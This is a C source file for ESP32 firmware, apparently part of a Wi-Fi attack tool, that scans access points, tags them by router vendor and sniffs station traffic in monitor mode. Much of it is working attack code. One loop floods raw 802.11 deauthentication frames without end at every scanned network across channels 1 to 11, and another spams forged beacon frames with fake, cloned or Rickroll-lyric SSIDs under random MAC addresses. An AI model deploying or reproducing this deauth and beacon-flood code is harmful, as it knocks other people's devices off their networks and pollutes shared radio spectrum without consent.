// wifi_manager.c

#include "managers/wifi_manager.h"
#include "managers/rgb_manager.h"
#include "freertos/FreeRTOS.h"
#include "freertos/event_groups.h"
#include "esp_wifi.h"
#include "esp_log.h"
#include "esp_event.h"
#include "nvs_flash.h"
#include <sys/time.h>
#include <string.h>
#include <esp_random.h>
#include <ctype.h>
#include <stdio.h>
#include "managers/settings_manager.h"


static uint16_t ap_count = 0;
static wifi_ap_record_t* scanned_aps = NULL;
static const char *TAG = "WiFiManager";
static EventGroupHandle_t wifi_event_group;
const int WIFI_CONNECTED_BIT = BIT0;
static wifi_ap_record_t selected_ap = {};

typedef enum {
    COMPANY_DLINK,
    COMPANY_NETGEAR,
    COMPANY_BELKIN,
    COMPANY_TPLINK,
    COMPANY_LINKSYS,
    COMPANY_ASUS,
    COMPANY_ACTIONTEC,
    COMPANY_UNKNOWN
} ECompany;

static void tolower_str(const uint8_t *src, char *dst) {
    for (int i = 0; i < 33 && src[i] != '\0'; i++) {
        dst[i] = tolower((char)src[i]);
    }
    dst[32] = '\0'; // Ensure null-termination
}

static int compare_ap_ssid_case_insensitive(const wifi_ap_record_t *ap1, const wifi_ap_record_t *ap2) {
    char ssid1_lower[33];
    char ssid2_lower[33];

    
    tolower_str(ap1->ssid, ssid1_lower);
    tolower_str(ap2->ssid, ssid2_lower);

    
    return strcmp(ssid1_lower, ssid2_lower);
}

// OUI lists for each company
const char *dlink_ouis[] = {
        "00055D", "000D88", "000F3D", "001195", "001346", "0015E9", "00179A", 
        "00195B", "001B11", "001CF0", "001E58", "002191", "0022B0", "002401", 
        "00265A", "00AD24", "04BAD6", "085A11", "0C0E76", "0CB6D2", "1062EB", 
        "10BEF5", "14D64D", "180F76", "1C5F2B", "1C7EE5", "1CAFF7", "1CBDB9", 
        "283B82", "302303", "340804", "340A33", "3C1E04", "3C3332", "4086CB", 
        "409BCD", "54B80A", "5CD998", "60634C", "642943", "6C198F", "6C7220", 
        "744401", "74DADA", "78321B", "78542E", "7898E8", "802689", "84C9B2", 
        "8876B9", "908D78", "9094E4", "9CD643", "A06391", "A0AB1B", "A42A95", 
        "A8637D", "ACF1DF", "B437D8", "B8A386", "BC0F9A", "BC2228", "BCF685", 
        "C0A0BB", "C4A81D", "C4E90A", "C8787D", "C8BE19", "C8D3A3", "CCB255", 
        "D8FEE3", "DCEAE7", "E01CFC", "E46F13", "E8CC18", "EC2280", "ECADE0", 
        "F07D68", "F0B4D2", "F48CEB", "F8E903", "FC7516"
    };
const char *netgear_ouis[] = {
        "00095B", "000FB5", "00146C", "001B2F", "001E2A", "001F33", "00223F", 
        "00224B2", "0026F2", "008EF2", "08028E", "0836C9", "08BD43", "100C6B", 
        "100D7F", "10DA43", "1459C0", "204E7F", "20E52A", "288088", "289401", 
        "28C68E", "2C3033", "2CB05D", "30469A", "3498B5", "3894ED", "3C3786", 
        "405D82", "44A56E", "4C60DE", "504A6E", "506A03", "54077D", "58EF68", 
        "6038E0", "6CB0CE", "6CCDD6", "744401", "803773", "841B5E", "8C3BAD", 
        "941865", "9C3DCF", "9CC9EB", "9CD36D", "A00460", "A021B7", "A040A0", 
        "A42B8C", "B03956", "B07FB9", "B0B98A", "BCA511", "C03F0E", "C0FFD4", 
        "C40415", "C43DC7", "C89E43", "CC40D0", "DCEF09", "E0469A", "E046EE", 
        "E091F5", "E4F4C6", "E8FCAF", "F87394"
    };
const char *belkin_ouis[] =  {
        "001150", "00173F", "0030BD", "08BD43", "149182", "24F5A2", "302303", 
        "80691A", "94103E", "944452", "B4750E", "C05627", "C4411E", "D8EC5E", 
        "E89F80", "EC1A59", "EC2280"
    };
const char *tplink_ouis[] = {
        "003192", "005F67", "1027F5", "14EBB6", "1C61B4", "203626", "2887BA", 
        "30DE4B", "3460F9", "3C52A1", "40ED00", "482254", "5091E3", "54AF97", 
        "5C628B", "5CA6E6", "5CE931", "60A4B7", "687FF0", "6C5AB0", "788CB5", 
        "7CC2C6", "9C5322", "9CA2F4", "A842A1", "AC15A2", "B0A7B9", "B4B024", 
        "C006C3", "CC68B6", "E848B8", "F0A731"
    };
const char *linksys_ouis[] = {
        "00045A", "000625", "000C41", "000E08", "000F66", "001217", "001310", 
        "0014BF", "0016B6", "001839", "0018F8", "001A70", "001C10", "001D7E", 
        "001EE5", "002129", "00226B", "002369", "00259C", "002354", "0024B2", 
        "003192", "005F67", "1027F5", "14EBB6", "1C61B4", "203626", "2887BA", 
        "305A3A", "2CFDA1", "302303", "30469A", "40ED00", "482254", "5091E3", 
        "54AF97", "5CA2F4", "5CA6E6", "5CE931", "60A4B7", "687FF0", "6C5AB0", 
        "788CB5", "7CC2C6", "9C5322", "9CA2F4", "A842A1", "AC15A2", "B0A7B9", 
        "B4B024", "C006C3", "CC68B6", "E848B8", "F0A731"
    };
const char *asus_ouis[] = {
        "000C6E", "000EA6", "00112F", "0011D8", "0013D4", "0015F2", "001731", 
        "0018F3", "001A92", "001BFC", "001D60", "001E8C", "001FC6", "002215", 
        "002354", "00248C", "002618", "00E018", "04421A", "049226", "04D4C4", 
        "04D9F5", "08606E", "086266", "08BFB8", "0C9D92", "107B44", "107C61", 
        "10BF48", "10C37B", "14DAE9", "14DDA9", "1831BF", "1C872C", "1CB72C", 
        "20CF30", "244BFE", "2C4D54", "2C56DC", "2CFDA1", "305A3A", "3085A9", 
        "3497F6", "382C4A", "38D547", "3C7C3F", "40167E", "40B076", "485B39", 
        "4CEDFB", "50465D", "50EBF6", "5404A6", "54A050", "581122", "6045CB", 
        "60A44C", "60CF84", "704D7B", "708BCD", "74D02B", "7824AF", "7C10C9", 
        "88D7F6", "90E6BA", "9C5C8E", "A036BC", "A85E45", "AC220B", "AC9E17", 
        "B06EBF", "BCAEC5", "BCEE7B", "C86000", "C87F54", "CC28AA", "D017C2", 
        "D45D64", "D850E6", "E03F49", "E0CB4E", "E89C25", "F02F74", "F07959", 
        "F46D04", "F832E4", "FC3497", "FCC233"
    };
const char *actiontec_ouis[] = {
        "000FB3", "001505", "001801", "001EA7", "001F90", "0020E0", "00247B", 
        "002662", "0026B8", "007F28", "0C6127", "105F06", "10785B", "109FA9", 
        "181BEB", "207600", "408B07", "4C8B30", "5C35FC", "7058A4", "70F196", 
        "70F220", "84E892", "941C56", "9C1E95", "A0A3E2", "A83944", "E86FF2", 
        "F8E4FB", "FC2BB2"
};

// WiFi event handler (same as before)
static void wifi_event_handler(void *arg, esp_event_base_t event_base, int32_t event_id, void *event_data) {
    if (event_base == WIFI_EVENT && event_id == WIFI_EVENT_STA_START) {
        ESP_LOGI(TAG, "WiFi started, ready to scan.");
    } else if (event_base == WIFI_EVENT && event_id == WIFI_EVENT_STA_DISCONNECTED) {
        ESP_LOGI(TAG, "Disconnected from WiFi");
        xEventGroupClearBits(wifi_event_group, WIFI_CONNECTED_BIT);
    } else if (event_base == IP_EVENT && event_id == IP_EVENT_STA_GOT_IP) {
        ip_event_got_ip_t *event = (ip_event_got_ip_t *)event_data;
        ESP_LOGI(TAG, "Got IP: " IPSTR, IP2STR(&event->ip_info.ip));
        xEventGroupSetBits(wifi_event_group, WIFI_CONNECTED_BIT);
    }
}

static void generate_random_ssid(char *ssid, size_t length) {
    const char charset[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    for (size_t i = 0; i < length - 1; i++) {
        int random_index = esp_random() % (sizeof(charset) - 1);
        ssid[i] = charset[random_index];
    }
    ssid[length - 1] = '\0';  // Null-terminate the SSID
}

static void generate_random_mac(uint8_t *mac) {
    esp_fill_random(mac, 6);   // Fill MAC address with random bytes
    mac[0] &= 0xFE;            // Unicast MAC address (least significant bit of the first byte should be 0)
    mac[0] |= 0x02;            // Locally administered MAC address (set the second least significant bit)
}

static bool station_exists(const uint8_t *station_mac, const uint8_t *ap_bssid) {
    for (int i = 0; i < station_count; i++) {
        if (memcmp(station_ap_list[i].station_mac, station_mac, 6) == 0 &&
            memcmp(station_ap_list[i].ap_bssid, ap_bssid, 6) == 0) {
            return true;
        }
    }
    return false;
}

static void add_station_ap_pair(const uint8_t *station_mac, const uint8_t *ap_bssid) {
    if (station_count < MAX_STATIONS) {
        memcpy(station_ap_list[station_count].station_mac, station_mac, 6);
        memcpy(station_ap_list[station_count].ap_bssid, ap_bssid, 6);
        station_count++;
        ESP_LOGI(TAG, "Added station MAC: %02X:%02X:%02X:%02X:%02X:%02X -> AP BSSID: %02X:%02X:%02X:%02X:%02X:%02X",
                 station_mac[0], station_mac[1], station_mac[2], station_mac[3], station_mac[4], station_mac[5],
                 ap_bssid[0], ap_bssid[1], ap_bssid[2], ap_bssid[3], ap_bssid[4], ap_bssid[5]);
    } else {
        ESP_LOGW(TAG, "Station list is full, can't add more stations.");
    }
}

// Function to match the BSSID to a company based on OUI
ECompany match_bssid_to_company(const uint8_t *bssid) {
    char oui[7]; // First 3 bytes of the BSSID
    snprintf(oui, sizeof(oui), "%02X%02X%02X", bssid[0], bssid[1], bssid[2]);

    // Check D-Link
    for (int i = 0; i < sizeof(dlink_ouis) / sizeof(dlink_ouis[0]); i++) {
        if (strcmp(oui, dlink_ouis[i]) == 0) {
            return COMPANY_DLINK;
        }
    }

    // Check Netgear
    for (int i = 0; i < sizeof(netgear_ouis) / sizeof(netgear_ouis[0]); i++) {
        if (strcmp(oui, netgear_ouis[i]) == 0) {
            return COMPANY_NETGEAR;
        }
    }

    // Check Belkin
    for (int i = 0; i < sizeof(belkin_ouis) / sizeof(belkin_ouis[0]); i++) {
        if (strcmp(oui, belkin_ouis[i]) == 0) {
            return COMPANY_BELKIN;
        }
    }

    // Check TP-Link
    for (int i = 0; i < sizeof(tplink_ouis) / sizeof(tplink_ouis[0]); i++) {
        if (strcmp(oui, tplink_ouis[i]) == 0) {
            return COMPANY_TPLINK;
        }
    }

    // Check Linksys
    for (int i = 0; i < sizeof(linksys_ouis) / sizeof(linksys_ouis[0]); i++) {
        if (strcmp(oui, linksys_ouis[i]) == 0) {
            return COMPANY_LINKSYS;
        }
    }

    // Check ASUS
    for (int i = 0; i < sizeof(asus_ouis) / sizeof(asus_ouis[0]); i++) {
        if (strcmp(oui, asus_ouis[i]) == 0) {
            return COMPANY_ASUS;
        }
    }

    // Check Actiontec
    for (int i = 0; i < sizeof(actiontec_ouis) / sizeof(actiontec_ouis[0]); i++) {
        if (strcmp(oui, actiontec_ouis[i]) == 0) {
            return COMPANY_ACTIONTEC;
        }
    }

    // Unknown company if no match found
    return COMPANY_UNKNOWN;
}

void wifi_stations_sniffer_callback(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_DATA) {
        return;
    }

    const wifi_promiscuous_pkt_t *packet = (wifi_promiscuous_pkt_t *)buf;
    const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)packet->payload;
    const wifi_ieee80211_hdr_t *hdr = &ipkt->hdr;

    
    const uint8_t *src_mac = hdr->addr2;  // Station MAC
    const uint8_t *dest_mac = hdr->addr1; // AP BSSID


    if (!station_exists(src_mac, dest_mac)) {
        add_station_ap_pair(src_mac, dest_mac);
    }
}

void wifi_manager_start_monitor_mode(wifi_promiscuous_cb_t_t callback) {
    
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_NULL));

 
    ESP_ERROR_CHECK(esp_wifi_set_promiscuous(true));

    
    ESP_ERROR_CHECK(esp_wifi_set_promiscuous_rx_cb(callback));

    ESP_LOGI(TAG, "WiFi monitor mode started. Scanning for stations...");
}

void wifi_manager_stop_monitor_mode() {
    ESP_ERROR_CHECK(esp_wifi_set_promiscuous(false));

    ESP_LOGI(TAG, "WiFi monitor mode stopped.");
}

void wifi_manager_init() {
    // Initialize NVS for WiFi storage (if needed)
    esp_err_t ret = nvs_flash_init();
    if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
        ESP_ERROR_CHECK(nvs_flash_erase());
        ESP_ERROR_CHECK(nvs_flash_init());
    }

    // Initialize the TCP/IP stack and WiFi driver
    ESP_ERROR_CHECK(esp_netif_init());
    ESP_ERROR_CHECK(esp_event_loop_create_default());
    esp_netif_create_default_wifi_ap();

    // Initialize WiFi with default settings
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();


    ESP_ERROR_CHECK(esp_wifi_init(&cfg));

    // Create the WiFi event group
    wifi_event_group = xEventGroupCreate();

    // Register the event handler for WiFi events
    ESP_ERROR_CHECK(esp_event_handler_instance_register(WIFI_EVENT, ESP_EVENT_ANY_ID, &wifi_event_handler, NULL, NULL));
    ESP_ERROR_CHECK(esp_event_handler_instance_register(IP_EVENT, IP_EVENT_STA_GOT_IP, &wifi_event_handler, NULL, NULL));

    // Set WiFi mode to STA (station)
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_APSTA));

    // Configure the SoftAP settings
    wifi_config_t ap_config = {
        .ap = {
            .ssid = "",
            .ssid_len = strlen(""),
            .password = "",
            .channel = 1,
            .authmode = WIFI_AUTH_OPEN,
            .max_connection = 4,
            .ssid_hidden = 1
        },
    };

    // Apply the AP configuration
    ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &ap_config));

    // Start the Wi-Fi AP
    ESP_ERROR_CHECK(esp_wifi_start());
}

// Start scanning for available networks
void wifi_manager_start_scan() {
    wifi_scan_config_t scan_config = {
        .ssid = NULL,
        .bssid = NULL,
        .channel = 0,
        .show_hidden = true
    };

    ESP_ERROR_CHECK(esp_wifi_scan_start(&scan_config, false));
    ESP_LOGI(TAG, "WiFi scanning started...");

    uint32_t random_duration = 5 + (esp_random() % 6);

    rgb_manager_set_color(&rgb_manager, 0, 50, 255, 50, false);


    vTaskDelay(random_duration * 1000 / portTICK_PERIOD_MS);


    wifi_manager_stop_scan();
}

// Stop scanning for networks
void wifi_manager_stop_scan() {
    ESP_ERROR_CHECK(esp_wifi_scan_stop());
    wifi_manager_stop_monitor_mode();

    rgb_manager_set_color(&rgb_manager, 0, 0, 0, 0, false);

    ESP_ERROR_CHECK(esp_wifi_scan_get_ap_num(&ap_count));

    if (ap_count > 0) {
        scanned_aps = malloc(sizeof(wifi_ap_record_t) * ap_count);
        if (scanned_aps == NULL) {
            ESP_LOGE(TAG, "Failed to allocate memory for AP info");
            return;
        }

        ESP_ERROR_CHECK(esp_wifi_scan_get_ap_records(&ap_count, scanned_aps));

        ESP_LOGI(TAG, "Found %d access points", ap_count);
    } else {
        ESP_LOGI(TAG, "No access points found");
    }
    
    ESP_LOGI(TAG, "WiFi scanning stopped.");
}

void wifi_manager_list_stations() {
    if (station_count == 0) {
        ESP_LOGI(TAG, "No stations found.");
        return;
    }

    ESP_LOGI(TAG, "Listing all stations and their associated APs:");

    for (int i = 0; i < station_count; i++) {
        ESP_LOGI(TAG, "Station MAC: %02X:%02X:%02X:%02X:%02X:%02X -> AP BSSID: %02X:%02X:%02X:%02X:%02X:%02X",
                 station_ap_list[i].station_mac[0], station_ap_list[i].station_mac[1], station_ap_list[i].station_mac[2],
                 station_ap_list[i].station_mac[3], station_ap_list[i].station_mac[4], station_ap_list[i].station_mac[5],
                 station_ap_list[i].ap_bssid[0], station_ap_list[i].ap_bssid[1], station_ap_list[i].ap_bssid[2],
                 station_ap_list[i].ap_bssid[3], station_ap_list[i].ap_bssid[4], station_ap_list[i].ap_bssid[5]);
    }
}

esp_err_t wifi_manager_broadcast_deauth(uint8_t bssid[6], int channel, uint8_t mac[6]) {
    esp_err_t err = esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    if (err != ESP_OK) {
        ESP_LOGE("WiFiManager", "Failed to set channel: %s", esp_err_to_name(err));
    }

    uint8_t deauth_frame_default[26] = {
        0xc0, 0x00, 0x3a, 0x01,
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0xf0, 0xff, 0x02, 0x00
    };

    
    // Build AP source packet
    deauth_frame_default[4] = mac[0];
    deauth_frame_default[5] = mac[1];
    deauth_frame_default[6] = mac[2];
    deauth_frame_default[7] = mac[3];
    deauth_frame_default[8] = mac[4];
    deauth_frame_default[9] = mac[5];
    
    deauth_frame_default[10] = bssid[0];
    deauth_frame_default[11] = bssid[1];
    deauth_frame_default[12] = bssid[2];
    deauth_frame_default[13] = bssid[3];
    deauth_frame_default[14] = bssid[4];
    deauth_frame_default[15] = bssid[5];

    deauth_frame_default[16] = bssid[0];
    deauth_frame_default[17] = bssid[1];
    deauth_frame_default[18] = bssid[2];
    deauth_frame_default[19] = bssid[3];
    deauth_frame_default[20] = bssid[4];
    deauth_frame_default[21] = bssid[5]; 

    
    esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
    esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
    err = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
    if (err != ESP_OK) {
        ESP_LOGE(TAG, "Failed to send beacon frame: %s", esp_err_to_name(err));
        return err;
    }

    return ESP_OK;
}

void wifi_deauth_task(void *param) {
    const char *ssid = (const char *)param;

    if (ap_count == 0) {
        ESP_LOGI(TAG, "No access points found");
        return;
    }

    wifi_ap_record_t *ap_info = scanned_aps;
    if (ap_info == NULL) {
        ESP_LOGE(TAG, "Failed to allocate memory for AP info");
        return;
    }

    while (1) {
        // if (strlen((const char*)selected_ap.ssid) > 0) // not 0 or NULL // TODO Figure out why deauth dosent work on selected ap
        // {
        //     for (int y = 1; y < 12; y++)
        //     {
        //         uint8_t broadcast_mac[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
        //         wifi_manager_broadcast_deauth(selected_ap.bssid, y, broadcast_mac);
        //         vTaskDelay(10 / portTICK_PERIOD_MS);
        //     }
        // }

        for (int i = 0; i < ap_count; i++)
        {
            for (int y = 1; y < 12; y++)
            {
                uint8_t broadcast_mac[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
                wifi_manager_broadcast_deauth(ap_info[i].bssid, y, broadcast_mac);
                vTaskDelay(settings_get_broadcast_speed(G_Settings) / portTICK_PERIOD_MS);
            }
        }
    }
}


void wifi_manager_start_deauth()
{
    if (!beacon_task_running) {
        ESP_LOGI(TAG, "Starting deauth transmission...");
        xTaskCreate(wifi_deauth_task, "deauth_task", 2048, NULL, 5, &deauth_task_handle);
        beacon_task_running = true;
        rgb_manager_set_color(&rgb_manager, 0, 255, 22, 23, false);
    } else {
        ESP_LOGW(TAG, "Deauth transmission already running.");
    }
}

void wifi_manager_select_ap(int index)
{
    
    if (ap_count == 0) {
        ESP_LOGI(TAG, "No access points found");
        return;
    }

    
    wifi_ap_record_t *ap_info = scanned_aps;
    if (ap_info == NULL) {
        ESP_LOGE(TAG, "No AP info available (scanned_aps is NULL)");
        return;
    }


    if (index < 0 || index >= ap_count) {
        ESP_LOGE(TAG, "Invalid index: %d. Index should be between 0 and %d", index, ap_count - 1);
        return;
    }

    
    selected_ap = ap_info[index];

    
    ESP_LOGI(TAG, "Selected Access Point: SSID: %s, BSSID: %02X:%02X:%02X:%02X:%02X:%02X",
             selected_ap.ssid,
             selected_ap.bssid[0], selected_ap.bssid[1], selected_ap.bssid[2],
             selected_ap.bssid[3], selected_ap.bssid[4], selected_ap.bssid[5]);

    printf("Selected Access Point Successfully\n");
}


void wifi_manager_stop_deauth()
{
    if (beacon_task_running) {
        ESP_LOGI(TAG, "Stopping deauth transmission...");
        if (deauth_task_handle != NULL) {
            vTaskDelete(deauth_task_handle);
            deauth_task_handle = NULL;
            beacon_task_running = false;
            rgb_manager_set_color(&rgb_manager, 0, 0, 0, 0, false);
        }
    } else {
        ESP_LOGW(TAG, "No deauth transmission is running.");
    }
}

// Print the scan results and match BSSID to known companies
void wifi_manager_print_scan_results_with_oui() {
    if (ap_count == 0) {
        ESP_LOGI(TAG, "No access points found");
        return;
    }

    wifi_ap_record_t *ap_info = scanned_aps;
    if (ap_info == NULL) {
        ESP_LOGE(TAG, "Failed to allocate memory for AP info");
        return;
    }


    ESP_LOGI(TAG, "Found %d access points:", ap_count);

    for (int i = 0; i < ap_count; i++) {
        const char *ssid_str = (strlen((char *)ap_info[i].ssid) > 0) ? (char *)ap_info[i].ssid : "Hidden Network";

        ECompany company = match_bssid_to_company(ap_info[i].bssid);
        const char* company_str = (company == 0) ? "DLink" :
                                  (company == 1) ? "Netgear" :
                                  (company == 2) ? "Belkin" :
                                  (company == 3) ? "TPLink" :
                                  (company == 4) ? "Linksys" :
                                  (company == 5) ? "ASUS" :
                                  (company == 6) ? "Actiontec" :
                                  "Unknown";

        ESP_LOGI(TAG, "[%d] SSID: %s, BSSID: %02X:%02X:%02X:%02X:%02X:%02X, RSSI: %d, Company: %s",
                 i,
                 ssid_str,
                 ap_info[i].bssid[0], ap_info[i].bssid[1], ap_info[i].bssid[2],
                 ap_info[i].bssid[3], ap_info[i].bssid[4], ap_info[i].bssid[5],
                 ap_info[i].rssi, company_str);
    }

    free(ap_info);
}


esp_err_t wifi_manager_broadcast_ap(const char *ssid) {
    uint8_t packet[256] = {
        0x80, 0x00, 0x00, 0x00,  // Frame Control, Duration
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff,  // Destination address (broadcast)
        0x01, 0x02, 0x03, 0x04, 0x05, 0x06,  // Source address (randomized later)
        0x01, 0x02, 0x03, 0x04, 0x05, 0x06,  // BSSID (randomized later)
        0xc0, 0x6c,  // Seq-ctl (sequence control)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // Timestamp (set to 0)
        0x64, 0x00,  // Beacon interval (100 TU)
        0x11, 0x04,  // Capability info (ESS)
    };

    
    generate_random_mac(&packet[10]);
    memcpy(&packet[16], &packet[10], 6);

    
    char ssid_buffer[RANDOM_SSID_LEN + 1];  
    if (ssid == NULL) {
        generate_random_ssid(ssid_buffer, RANDOM_SSID_LEN + 1);
        ssid = ssid_buffer;
    }

    uint8_t ssid_len = strlen(ssid);
    packet[37] = ssid_len;
    memcpy(&packet[38], ssid, ssid_len);

   
    uint8_t *supported_rates_ie = &packet[38 + ssid_len];
    supported_rates_ie[0] = 0x01;  // Supported Rates IE tag
    supported_rates_ie[1] = 0x08;  // Length (8 rates)
    supported_rates_ie[2] = 0x82;  // 1 Mbps
    supported_rates_ie[3] = 0x84;  // 2 Mbps
    supported_rates_ie[4] = 0x8B;  // 5.5 Mbps
    supported_rates_ie[5] = 0x96;  // 11 Mbps
    supported_rates_ie[6] = 0x24;  // 18 Mbps
    supported_rates_ie[7] = 0x30;  // 24 Mbps
    supported_rates_ie[8] = 0x48;  // 36 Mbps
    supported_rates_ie[9] = 0x6C;  // 54 Mbps

    
    uint8_t *ds_param_set_ie = &supported_rates_ie[10];
    ds_param_set_ie[0] = 0x03;  // DS Parameter Set IE tag
    ds_param_set_ie[1] = 0x01;  // Length (1 byte)

    
    uint8_t primary_channel;
    wifi_second_chan_t second_channel;
    esp_wifi_get_channel(&primary_channel, &second_channel);
    ds_param_set_ie[2] = primary_channel;  // Set the current channel

   
    uint8_t *he_capabilities_ie = &ds_param_set_ie[3];
    he_capabilities_ie[0] = 0xFF;  // Vendor-Specific IE tag (802.11ax capabilities)
    he_capabilities_ie[1] = 0x23;  // Length
    he_capabilities_ie[2] = 0x50;  // OUI - Wi-Fi Alliance OUI
    he_capabilities_ie[3] = 0x6F;  // OUI
    he_capabilities_ie[4] = 0x9A;  // OUI
    he_capabilities_ie[5] = 0x1A;  // OUI type - HE Capabilities

    
    he_capabilities_ie[6] = 0x00;
    he_capabilities_ie[7] = 0x00;
    he_capabilities_ie[8] = 0x00;

   
    size_t packet_size = (38 + ssid_len + 12 + 3 + 9);

    
    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, packet, packet_size, false);
    if (err != ESP_OK) {
        ESP_LOGE(TAG, "Failed to send beacon frame: %s", esp_err_to_name(err));
        return err;
    }

    return ESP_OK;
}

void wifi_manager_stop_beacon()
{
    if (beacon_task_running) {
        ESP_LOGI(TAG, "Stopping beacon transmission...");
        if (beacon_task_handle != NULL) {
            vTaskDelete(beacon_task_handle);
            beacon_task_handle = NULL;
            beacon_task_running = false;
        }
        rgb_manager_set_color(&rgb_manager, 0, 0, 0, 0, false);
    } else {
        ESP_LOGW(TAG, "No beacon transmission is running.");
    }
}

void wifi_beacon_task(void *param) {
    const char *ssid = (const char *)param;

    // Array to store lines of the chorus
    const char *rickroll_lyrics[] = {
        "Never gonna give you up",
        "Never gonna let you down",
        "Never gonna run around and desert you",
        "Never gonna make you cry",
        "Never gonna say goodbye",
        "Never gonna tell a lie and hurt you"
    };
    int num_lines = 5;
    int line_index = 0;

    int IsRickRoll = ssid != NULL ? (strcmp(ssid, "RICKROLL") == 0) : false;
    int IsAPList = ssid != NULL ? (strcmp(ssid, "APLISTMODE") == 0) : false;

    while (1) {
        if (IsRickRoll) {
            wifi_manager_broadcast_ap(rickroll_lyrics[line_index]);

            line_index = (line_index + 1) % num_lines;
        } 
        else if (IsAPList) 
        {
            for (int i = 0; i < ap_count; i++)
            {
                wifi_manager_broadcast_ap((const char*)scanned_aps[i].ssid);
                vTaskDelay(10 / portTICK_PERIOD_MS);
            }
        }
        else 
        {
            wifi_manager_broadcast_ap(ssid);
        }

        vTaskDelay(settings_get_broadcast_speed(G_Settings) / portTICK_PERIOD_MS);


        uint8_t random_channel = (esp_random() % 11) + 1;
        esp_err_t err = esp_wifi_set_channel(random_channel, WIFI_SECOND_CHAN_NONE);
        if (err != ESP_OK) {
            ESP_LOGE("WiFiManager", "Failed to set channel: %s", esp_err_to_name(err));
        }
    }
}

void wifi_manager_start_beacon(const char *ssid) {
    if (!beacon_task_running) {
        ESP_LOGI(TAG, "Starting beacon transmission...");
        xTaskCreate(wifi_beacon_task, "beacon_task", 2048, (void *)ssid, 5, &beacon_task_handle);
        beacon_task_running = true;
        rgb_manager_set_color(&rgb_manager, 0, 255, 0, 0, false);
    } else {
        ESP_LOGW(TAG, "Beacon transmission already running.");
    }
}